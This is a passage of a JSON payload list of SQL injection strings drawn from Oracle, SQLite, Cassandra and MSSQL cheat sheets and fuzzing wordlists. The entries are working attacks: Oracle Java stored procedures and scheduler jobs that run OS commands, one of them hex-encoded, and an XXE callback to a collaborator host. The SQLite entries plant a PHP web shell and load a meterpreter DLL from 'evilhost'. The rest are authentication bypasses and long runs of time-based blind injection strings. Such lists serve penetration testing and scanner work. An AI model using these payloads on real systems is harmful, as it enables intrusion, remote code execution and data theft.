    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Subselect is enabled    | `SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Table log_table exists   | `SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| Function    | Example                                   |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| ----------- | ----------------------------------------- |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "SELECT os_command.exec_clob('<COMMAND>') cmd from dual",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "* [Error Based Injection | NetSPI SQL Injection Wiki - NetSPI - February 15, 2021](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)",
    "category": "sql injection",
    "source_file": "OracleSQL Injection.md"
  },
  {
    "payload": "username: admin' ALLOW FILTERING; %00\n",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "username: admin'/*\n",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "password: */and pass>'\n",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;\n",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "> Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system.",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging.",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "* Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected.",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "* CQL does not allow subqueries or other nested statements, so a query like `SELECT * FROM table WHERE column=(SELECT column FROM table LIMIT 1);` would be rejected.",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "username: admin' ALLOW FILTERING; %00",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "username: admin'/*",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "password: */and pass>'",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;",
    "category": "sql injection",
    "source_file": "Cassandra Injection.md"
  },
  {
    "payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "ATTACH DATABASE '/var/www/lol.php' AS lol;\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "CREATE TABLE lol.pwn (dataz text);\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");--\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "SELECT writefile('/path/to/file', column_name) FROM table_name\n",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or \"inject\" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Description         | Comment |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| ------------- | ----------------------------------------- |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| DBMS version  | `select sqlite_version();`                |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Description             | SQL Query                                 |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| ----------------------- | ----------------------------------------- |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "ATTACH DATABASE '/var/www/lol.php' AS lol;",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "CREATE TABLE lol.pwn (dataz text);",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "SELECT writefile('/path/to/file', column_name) FROM table_name",
    "category": "sql injection",
    "source_file": "SQLite Injection.md"
  },
  {
    "payload": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),\u200bSLEEP(1)))OR\"*/ FROM some_table WHERE ex = ample",
    "category": "sql injection",
    "source_file": "SQLi_Polyglots.txt"
  },
  {
    "payload": "waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "' waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "' waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\" waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\" waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ") waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ") waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ")) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ")) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ")))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ")))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "))))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": ")))))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "') waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "') waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\") waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\") waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "')) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "')) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\")) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\")) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "'))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "'))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "')))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "')))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "'))))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "'))))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\"))))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "')))))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "')))))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))))) waitfor delay '0:0:20' /*",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "\")))))) waitfor delay '0:0:20' ",
    "category": "sql injection",
    "source_file": "FUZZDB_MSSQL-WHERE_Time.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
    "category": "sql injection",
